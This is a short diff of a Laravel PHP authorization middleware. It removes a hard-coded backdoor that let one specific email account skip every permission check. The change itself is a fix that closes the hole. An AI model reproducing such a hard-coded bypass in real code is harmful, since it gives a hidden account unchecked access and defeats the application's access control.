@@ -17,9 +17,6 @@ class PermissionsAuth
      */
     public function handle($request, Closure $next)
     {
-        if ('pltruenine@163.com' === auth('api')->user()->email) {
-            return $next($request);
-        }
         $id = auth('api')->id();
         $authService = new AuthService();
 
